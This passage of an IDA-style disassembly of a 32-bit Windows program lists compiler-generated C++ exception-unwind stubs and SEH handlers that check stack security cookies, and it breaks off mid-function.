sub_41E9F3      proc near               ; DATA XREF: .rdata:00423860↓o
                lea     ecx, [ebp-1134h]
                jmp     sub_4085D0
sub_41E9F3      endp


; =============== S U B R O U T I N E =======================================


sub_41E9FE      proc near               ; DATA XREF: .rdata:00423868↓o
                lea     ecx, [ebp-116Ch]
                jmp     sub_4085D0
sub_41E9FE      endp


; =============== S U B R O U T I N E =======================================


sub_41EA09      proc near               ; DATA XREF: .rdata:00423870↓o

; FUNCTION CHUNK AT 00408510 SIZE 00000043 BYTES

                lea     esi, [ebp-11BCh]
                jmp     loc_408510
sub_41EA09      endp


; =============== S U B R O U T I N E =======================================


sub_41EA14      proc near               ; DATA XREF: .rdata:00423878↓o

; FUNCTION CHUNK AT 00408510 SIZE 00000043 BYTES

                lea     esi, [ebp-11FCh]
                jmp     loc_408510
sub_41EA14      endp


; =============== S U B R O U T I N E =======================================


sub_41EA1F      proc near               ; DATA XREF: .rdata:00423880↓o
                lea     ecx, [ebp-116Ch]
                jmp     sub_4085D0
sub_41EA1F      endp


; =============== S U B R O U T I N E =======================================


sub_41EA2A      proc near               ; DATA XREF: .rdata:00423888↓o

; FUNCTION CHUNK AT 00408510 SIZE 00000043 BYTES

                lea     esi, [ebp-11BCh]
                jmp     loc_408510
sub_41EA2A      endp


; =============== S U B R O U T I N E =======================================


sub_41EA35      proc near               ; DATA XREF: .rdata:00423890↓o

; FUNCTION CHUNK AT 00408510 SIZE 00000043 BYTES

                lea     esi, [ebp-11FCh]
                jmp     loc_408510
sub_41EA35      endp


; =============== S U B R O U T I N E =======================================


sub_41EA40      proc near               ; DATA XREF: .rdata:00423898↓o
                lea     ecx, [ebp-116Ch]
                jmp     sub_4085D0
sub_41EA40      endp


; =============== S U B R O U T I N E =======================================


sub_41EA4B      proc near               ; DATA XREF: .rdata:004238A0↓o
                lea     ecx, [ebp-116Ch]
                jmp     sub_4085D0
sub_41EA4B      endp


; =============== S U B R O U T I N E =======================================


sub_41EA56      proc near               ; DATA XREF: .rdata:004238A8↓o
                lea     ecx, [ebp-116Ch]
                jmp     sub_4085D0
sub_41EA56      endp


; =============== S U B R O U T I N E =======================================


sub_41EA61      proc near               ; DATA XREF: .rdata:004238B0↓o
                lea     ecx, [ebp-116Ch]
                jmp     sub_4085D0
sub_41EA61      endp


; =============== S U B R O U T I N E =======================================


sub_41EA6C      proc near               ; DATA XREF: .rdata:004238B8↓o
                lea     ecx, [ebp-116Ch]
                jmp     sub_4085D0
sub_41EA6C      endp


; =============== S U B R O U T I N E =======================================


sub_41EA77      proc near               ; DATA XREF: .rdata:004238C0↓o
                lea     ecx, [ebp-116Ch]
                jmp     sub_4085D0
sub_41EA77      endp


; =============== S U B R O U T I N E =======================================


sub_41EA82      proc near               ; DATA XREF: .rdata:004238C8↓o
                lea     ecx, [ebp-116Ch]
                jmp     sub_4085D0
sub_41EA82      endp


; =============== S U B R O U T I N E =======================================


SEH_407940      proc near               ; DATA XREF: sub_407940+2↑o
                                        ; .rdata:00422B54↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-1234h]
                mov     ecx, [edx-1238h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 10h
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_4238D0
                jmp     ___CxxFrameHandler3
SEH_407940      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41EAC0      proc near               ; DATA XREF: .rdata:stru_4238F4↓o
                lea     ecx, [ebp-2634h]
                jmp     sub_4085D0
sub_41EAC0      endp


; =============== S U B R O U T I N E =======================================


SEH_407620      proc near               ; DATA XREF: sub_407620+2↑o
                                        ; .rdata:00422B58↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-2634h]
                mov     ecx, [edx-2638h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 8
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_4238FC
                jmp     ___CxxFrameHandler3
SEH_407620      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41EB00      proc near               ; DATA XREF: .rdata:stru_423920↓o
                lea     ecx, [ebp-250h]
                jmp     sub_4085D0
sub_41EB00      endp


; =============== S U B R O U T I N E =======================================


sub_41EB0B      proc near               ; DATA XREF: .rdata:00423928↓o
                lea     ecx, [ebp-250h]
                jmp     sub_4085D0
sub_41EB0B      endp


; =============== S U B R O U T I N E =======================================


sub_41EB16      proc near               ; DATA XREF: .rdata:00423930↓o
                lea     ecx, [ebp-250h]
                jmp     sub_4085D0
sub_41EB16      endp


; =============== S U B R O U T I N E =======================================


sub_41EB21      proc near               ; DATA XREF: .rdata:00423938↓o
                lea     ecx, [ebp-234h]
                jmp     sub_4085D0
sub_41EB21      endp


; =============== S U B R O U T I N E =======================================


SEH_406A40      proc near               ; DATA XREF: sub_406A40+2↑o
                                        ; .rdata:00422B5C↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-24Ch]
                mov     ecx, [edx-250h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 4
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423940
                jmp     ___CxxFrameHandler3
SEH_406A40      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41EB60      proc near               ; DATA XREF: .rdata:stru_423964↓o
                lea     ecx, [ebp-42Ch]
                jmp     sub_4085D0
sub_41EB60      endp


; =============== S U B R O U T I N E =======================================


SEH_4064E0      proc near               ; DATA XREF: sub_4064E0+2↑o
                                        ; .rdata:00422B60↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-424h]
                mov     ecx, [edx-428h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 4
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_42396C
                jmp     ___CxxFrameHandler3
SEH_4064E0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41EBA0      proc near               ; DATA XREF: .rdata:stru_423990↓o
                lea     ecx, [ebp-874h]
                jmp     sub_4085D0
sub_41EBA0      endp


; =============== S U B R O U T I N E =======================================


sub_41EBAB      proc near               ; DATA XREF: .rdata:00423998↓o
                lea     ecx, [ebp-890h]
                jmp     sub_4085D0
sub_41EBAB      endp


; =============== S U B R O U T I N E =======================================


SEH_4062E0      proc near               ; DATA XREF: sub_4062E0+2↑o
                                        ; .rdata:00422B64↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-89Ch]
                mov     ecx, [edx-8A0h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 8
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_4239A0
                jmp     ___CxxFrameHandler3
SEH_4062E0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41EBF0      proc near               ; DATA XREF: .rdata:stru_4239C4↓o
                lea     ecx, [ebp-1090h]
                jmp     sub_4085D0
sub_41EBF0      endp


; =============== S U B R O U T I N E =======================================


sub_41EBFB      proc near               ; DATA XREF: .rdata:004239CC↓o
                lea     ecx, [ebp-1074h]
                jmp     sub_4085D0
sub_41EBFB      endp


; =============== S U B R O U T I N E =======================================


SEH_405F00      proc near               ; DATA XREF: sub_405F00+2↑o
                                        ; .rdata:00422B68↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-109Ch]
                mov     ecx, [edx-10A0h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 8
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_4239D4
                jmp     ___CxxFrameHandler3
SEH_405F00      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41EC40      proc near               ; DATA XREF: .rdata:stru_4239F8↓o

; FUNCTION CHUNK AT 0040D860 SIZE 0000000F BYTES

                lea     eax, [ebp-44h]
                jmp     loc_40D860
sub_41EC40      endp


; =============== S U B R O U T I N E =======================================


sub_41EC48      proc near               ; DATA XREF: .rdata:00423A00↓o
                lea     ecx, [ebp-3Ch]
                jmp     sub_4085D0
sub_41EC48      endp


; =============== S U B R O U T I N E =======================================


SEH_405850      proc near               ; DATA XREF: sub_405850+2↑o
                                        ; .rdata:00422B6C↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-44h]
                mov     ecx, [edx-48h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 8
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423A08
                jmp     ___CxxFrameHandler3
SEH_405850      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41EC80      proc near               ; DATA XREF: .rdata:stru_423A2C↓o

; FUNCTION CHUNK AT 0040D860 SIZE 0000000F BYTES

                lea     eax, [ebp-2034h]
                jmp     loc_40D860
sub_41EC80      endp


; =============== S U B R O U T I N E =======================================


sub_41EC8B      proc near               ; DATA XREF: .rdata:00423A34↓o
                lea     ecx, [ebp-202Ch]
                jmp     sub_4085D0
sub_41EC8B      endp


; =============== S U B R O U T I N E =======================================


SEH_405710      proc near               ; DATA XREF: sub_405710+2↑o
                                        ; .rdata:00422B70↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-202Ch]
                mov     ecx, [edx-2030h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 4
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423A3C
                jmp     ___CxxFrameHandler3
SEH_405710      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41ECD0      proc near               ; DATA XREF: .rdata:stru_423A60↓o
                lea     ecx, [ebp-182Ch]
                jmp     sub_4085D0
sub_41ECD0      endp


; =============== S U B R O U T I N E =======================================


SEH_4050B0      proc near               ; DATA XREF: sub_4050B0+2↑o
                                        ; .rdata:00422B74↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-1834h]
                mov     ecx, [edx-1838h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 0Ch
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423A68
                jmp     ___CxxFrameHandler3
SEH_4050B0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41ED10      proc near               ; DATA XREF: .rdata:stru_423A8C↓o
                lea     ecx, [ebp-2030h]
                jmp     sub_4085D0
sub_41ED10      endp


; =============== S U B R O U T I N E =======================================


SEH_404BF0      proc near               ; DATA XREF: sub_404BF0+2↑o
                                        ; .rdata:00422B78↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-2048h]
                mov     ecx, [edx-204Ch]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 0Ch
                mov     ecx, [edx-8]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423A94
                jmp     ___CxxFrameHandler3
SEH_404BF0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41ED50      proc near               ; DATA XREF: .rdata:stru_423AB8↓o
                lea     ecx, [ebp-2430h]
                jmp     sub_4085D0
sub_41ED50      endp


; =============== S U B R O U T I N E =======================================


SEH_403980      proc near               ; DATA XREF: sub_403980+2↑o
                                        ; .rdata:00422B7C↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-2438h]
                mov     ecx, [edx-243Ch]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 8
                mov     ecx, [edx-8]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423AC0
                jmp     ___CxxFrameHandler3
SEH_403980      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41ED90      proc near               ; DATA XREF: .rdata:stru_423AE4↓o
                lea     ecx, [ebp-430h]
                jmp     sub_4085D0
sub_41ED90      endp


; =============== S U B R O U T I N E =======================================


sub_41ED9B      proc near               ; DATA XREF: .rdata:00423AEC↓o
                lea     ecx, [ebp-44Ch]
                jmp     sub_4085D0
sub_41ED9B      endp


; =============== S U B R O U T I N E =======================================


SEH_403800      proc near               ; DATA XREF: sub_403800+2↑o
                                        ; .rdata:00422B80↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-448h]
                mov     ecx, [edx-44Ch]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 4
                mov     ecx, [edx-8]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423AF4
                jmp     ___CxxFrameHandler3
SEH_403800      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41EDE0      proc near               ; DATA XREF: .rdata:stru_423B18↓o
                lea     ecx, [ebp-2830h]
                jmp     sub_4085D0
sub_41EDE0      endp


; =============== S U B R O U T I N E =======================================


SEH_403630      proc near               ; DATA XREF: sub_403630+2↑o
                                        ; .rdata:00422B84↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-2840h]
                mov     ecx, [edx-2844h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 10h
                mov     ecx, [edx-8]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423B20
                jmp     ___CxxFrameHandler3
SEH_403630      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41EE20      proc near               ; DATA XREF: .rdata:stru_423B44↓o
                lea     ecx, [ebp-4E30h]
                jmp     sub_4085D0
sub_41EE20      endp


; =============== S U B R O U T I N E =======================================


sub_41EE2B      proc near               ; DATA XREF: .rdata:00423B4C↓o
                lea     ecx, [ebp-4E4Ch]
                jmp     sub_4085D0
sub_41EE2B      endp


; =============== S U B R O U T I N E =======================================


sub_41EE36      proc near               ; DATA XREF: .text:00402F42↑o
                                        ; .rdata:00422B88↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-4E78h]
                mov     ecx, [edx-4E7Ch]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 10h
                mov     ecx, [edx-8]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423B54
                jmp     ___CxxFrameHandler3
sub_41EE36      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41EE70      proc near               ; DATA XREF: .rdata:stru_423B78↓o
                lea     ecx, [ebp-1A30h]
                jmp     sub_4085D0
sub_41EE70      endp


; =============== S U B R O U T I N E =======================================


sub_41EE7B      proc near               ; DATA XREF: .rdata:00423B80↓o
                lea     ecx, [ebp-1A4Ch]
                jmp     sub_4085D0
sub_41EE7B      endp


; =============== S U B R O U T I N E =======================================


SEH_402A00      proc near               ; DATA XREF: sub_402A00+2↑o
                                        ; .rdata:00422B8C↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-1A60h]
                mov     ecx, [edx-1A64h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 10h
                mov     ecx, [edx-8]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423B88
                jmp     ___CxxFrameHandler3
SEH_402A00      endp

; ---------------------------------------------------------------------------
                align 10h
; [00000005 BYTES: COLLAPSED FUNCTION j_nullsub_2_4. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B R O U T I N E =======================================


SEH_40B050      proc near               ; DATA XREF: sub_40B050+5↑o
                                        ; .rdata:00422B90↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-1Ch]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423BE8
                jmp     ___CxxFrameHandler3
SEH_40B050      endp


; =============== S U B R O U T I N E =======================================


sub_41EEE0      proc near               ; DATA XREF: .rdata:00423C1C↓o
                lea     ecx, [ebp-30h]
                jmp     sub_4085D0
sub_41EEE0      endp


; =============== S U B R O U T I N E =======================================


sub_41EEE8      proc near               ; DATA XREF: .rdata:00423C34↓o
                lea     ecx, [ebp-4Ch]
                jmp     sub_4085D0
sub_41EEE8      endp


; =============== S U B R O U T I N E =======================================


SEH_40A030      proc near               ; DATA XREF: sub_40A030+5↑o
                                        ; .rdata:00422B94↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-68h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     ecx, [edx-8]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423C84
                jmp     ___CxxFrameHandler3
SEH_40A030      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41EF20      proc near               ; DATA XREF: .rdata:stru_423CA8↓o
                lea     ecx, [ebp-0DB4h]
                jmp     sub_4085D0
sub_41EF20      endp


; =============== S U B R O U T I N E =======================================


sub_41EF2B      proc near               ; DATA XREF: .rdata:00423CB0↓o
                lea     ecx, [ebp-0DB4h]
                jmp     sub_4085D0
sub_41EF2B      endp


; =============== S U B R O U T I N E =======================================


sub_41EF36      proc near               ; DATA XREF: .rdata:00423CB8↓o
                lea     ecx, [ebp-0D34h]
                jmp     sub_4085D0
sub_41EF36      endp


; =============== S U B R O U T I N E =======================================


SEH_407110      proc near               ; DATA XREF: sub_407110+2↑o
                                        ; .rdata:00422B98↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-0DBCh]
                mov     ecx, [edx-0DC0h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 10h
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423CC0
                jmp     ___CxxFrameHandler3
SEH_407110      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41EF70      proc near               ; DATA XREF: .rdata:stru_423CE4↓o
                lea     ecx, [ebp-2864h]
                jmp     sub_4085D0
sub_41EF70      endp


; =============== S U B R O U T I N E =======================================


sub_41EF7B      proc near               ; DATA XREF: .rdata:00423CEC↓o
                lea     ecx, [ebp-2864h]
                jmp     sub_4085D0
sub_41EF7B      endp


; =============== S U B R O U T I N E =======================================


sub_41EF86      proc near               ; DATA XREF: .rdata:00423CF4↓o
                lea     ecx, [ebp-2864h]
                jmp     sub_4085D0
sub_41EF86      endp


; =============== S U B R O U T I N E =======================================


sub_41EF91      proc near               ; DATA XREF: .rdata:00423CFC↓o
                lea     ecx, [ebp-2834h]
                jmp     sub_4085D0
sub_41EF91      endp


; =============== S U B R O U T I N E =======================================


SEH_406C90      proc near               ; DATA XREF: sub_406C90+2↑o
                                        ; .rdata:00422B9C↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-286Ch]
                mov     ecx, [edx-2870h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 10h
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423D04
                jmp     ___CxxFrameHandler3
SEH_406C90      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41EFD0      proc near               ; DATA XREF: .rdata:stru_423D28↓o
                lea     ecx, [ebp-684h]
                jmp     sub_4085D0
sub_41EFD0      endp


; =============== S U B R O U T I N E =======================================


SEH_4067C0      proc near               ; DATA XREF: sub_4067C0+2↑o
                                        ; .rdata:00422BA0↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-68Ch]
                mov     ecx, [edx-690h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 8
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423D30
                jmp     ___CxxFrameHandler3
SEH_4067C0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41F010      proc near               ; DATA XREF: .rdata:stru_423D54↓o
                lea     ecx, [ebp-28h]
                jmp     sub_4085D0
sub_41F010      endp


; =============== S U B R O U T I N E =======================================


SEH_406690      proc near               ; DATA XREF: sub_406690+2↑o
                                        ; .rdata:00422BA4↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-24h]
                mov     ecx, [edx-28h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423D5C
                jmp     ___CxxFrameHandler3
SEH_406690      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41F040      proc near               ; DATA XREF: .rdata:stru_423D80↓o
                lea     ecx, [ebp-63Ch]
                jmp     sub_4085D0
sub_41F040      endp


; =============== S U B R O U T I N E =======================================


sub_41F04B      proc near               ; DATA XREF: .rdata:00423D88↓o
                lea     ecx, [ebp-658h]
                jmp     sub_4085D0
sub_41F04B      endp


; =============== S U B R O U T I N E =======================================


SEH_405C60      proc near               ; DATA XREF: sub_4059A0+2↑o
                                        ; sub_405C60+2↑o ...

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-65Ch]
                mov     ecx, [edx-660h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 10h
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423D90
                jmp     ___CxxFrameHandler3
SEH_405C60      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41F090      proc near               ; DATA XREF: .rdata:stru_423DB4↓o
                lea     ecx, [ebp-93ECh]
                jmp     sub_4085D0
sub_41F090      endp


; =============== S U B R O U T I N E =======================================


SEH_4052B0      proc near               ; DATA XREF: sub_4052B0+2↑o
                                        ; .rdata:00422BAC↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-93F4h]
                mov     ecx, [edx-93F8h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 8
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423DBC
                jmp     ___CxxFrameHandler3
SEH_4052B0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41F0D0      proc near               ; DATA XREF: .rdata:stru_423DE0↓o
                lea     ecx, [ebp-2Ch]
                jmp     sub_4085D0
sub_41F0D0      endp


; =============== S U B R O U T I N E =======================================


SEH_4027B0      proc near               ; DATA XREF: sub_4027B0+2↑o
                                        ; .rdata:00422BB0↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-30h]
                mov     ecx, [edx-34h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 10h
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423DE8
                jmp     ___CxxFrameHandler3
SEH_4027B0      endp


; =============== S U B R O U T I N E =======================================


sub_41F100      proc near               ; DATA XREF: .rdata:stru_423E0C↓o

; FUNCTION CHUNK AT 0040DF10 SIZE 0000002B BYTES

                lea     esi, [ebp-42C9Ch]
                jmp     loc_40DF10
sub_41F100      endp


; =============== S U B R O U T I N E =======================================


sub_41F10B      proc near               ; DATA XREF: .rdata:00423E14↓o
                lea     ecx, [ebp-42C54h]
                jmp     sub_4085D0
sub_41F10B      endp


; =============== S U B R O U T I N E =======================================


SEH_401E10      proc near               ; DATA XREF: sub_401E10+8↑o
                                        ; .rdata:00422BB4↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-42CA4h]
                mov     ecx, [edx-42CA8h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 0Ch
                mov     ecx, [edx-8]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423E1C
                jmp     ___CxxFrameHandler3
SEH_401E10      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


SEH_40B900      proc near               ; DATA XREF: sub_40B900+2↑o
                                        ; .rdata:00422BB8↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-10h]
                mov     ecx, [edx-14h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423E48
                jmp     ___CxxFrameHandler3
SEH_40B900      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41F170      proc near               ; DATA XREF: .rdata:stru_423E6C↓o

; FUNCTION CHUNK AT 00408C00 SIZE 0000000A BYTES

                lea     eax, [ebp-2Ch]
                jmp     loc_408C00
sub_41F170      endp


; =============== S U B R O U T I N E =======================================


sub_41F178      proc near               ; DATA XREF: .rdata:00423E74↓o
                lea     esi, [ebp-2Ch]
                jmp     sub_40B240
sub_41F178      endp

; [00000005 BYTES: COLLAPSED FUNCTION j_nullsub_2_5. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B R O U T I N E =======================================


SEH_40B580      proc near               ; DATA XREF: sub_40B580+5↑o
                                        ; .rdata:00422BBC↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-34h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423EB8
                jmp     ___CxxFrameHandler3
SEH_40B580      endp


; =============== S U B R O U T I N E =======================================


sub_41F1A0      proc near               ; DATA XREF: .rdata:00423EEC↓o
                lea     esi, [ebp-3Ch]
                jmp     sub_40B240
sub_41F1A0      endp


; =============== S U B R O U T I N E =======================================


sub_41F1A8      proc near               ; DATA XREF: .rdata:00423F04↓o
                lea     esi, [ebp-54h]
                jmp     sub_40B240
sub_41F1A8      endp


; =============== S U B R O U T I N E =======================================


SEH_4099D0      proc near               ; DATA XREF: sub_4099D0+5↑o
                                        ; .rdata:00422BC0↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-58h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423F54
                jmp     ___CxxFrameHandler3
SEH_4099D0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41F1D0      proc near               ; DATA XREF: .rdata:stru_423F78↓o

; FUNCTION CHUNK AT 00408C00 SIZE 0000000A BYTES

                lea     eax, [ebp-44h]
                jmp     loc_408C00
sub_41F1D0      endp


; =============== S U B R O U T I N E =======================================


sub_41F1D8      proc near               ; DATA XREF: .rdata:00423F80↓o
                lea     esi, [ebp-44h]
                jmp     sub_40B240
sub_41F1D8      endp


; =============== S U B R O U T I N E =======================================


sub_41F1E0      proc near               ; DATA XREF: .rdata:00423F88↓o
                lea     ecx, [ebp-2Ch]
                jmp     sub_4085D0
sub_41F1E0      endp


; =============== S U B R O U T I N E =======================================


sub_41F1E8      proc near               ; DATA XREF: .rdata:00423F90↓o
                lea     ecx, [ebp-2Ch]
                jmp     sub_4085D0
sub_41F1E8      endp


; =============== S U B R O U T I N E =======================================


SEH_403F70      proc near               ; DATA XREF: sub_403F70+2↑o
                                        ; .rdata:00422BC4↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-48h]
                mov     ecx, [edx-4Ch]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423F98
                jmp     ___CxxFrameHandler3
SEH_403F70      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41F210      proc near               ; DATA XREF: .rdata:004201F0↓o
                call    sub_408630
